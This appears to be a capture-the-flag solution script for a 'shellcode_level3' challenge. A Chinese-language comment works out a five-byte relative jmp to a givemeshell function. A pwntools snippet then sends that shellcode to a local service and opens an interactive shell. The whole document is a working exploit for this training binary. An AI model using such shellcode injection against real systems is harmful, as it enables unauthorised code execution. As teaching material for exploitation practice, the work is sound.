"""
  gets(&code);
  ((void (*)(void))code)();

code 0x404089 能写入五个字节
call rdx -> call 0x404089
givemeshell_addr: 0x4011D6

偏移地址 = 目的地址 - 跳转基地址(jmp的下一条指令的地址) , jmp + 4字节跳转 下一条地址在 0x40408E
         = 0x4011D6 - 0x40408E = 0xffffd148
可以用 KeyPatch自动算
"""
from pwn import *

context.arch = "amd64"
p = remote('localhost',33731)
# p = process('./shellcode_level3')

p.sendline(b"\xE9\x48\xD1\xFF\xFF")
p.interactive()
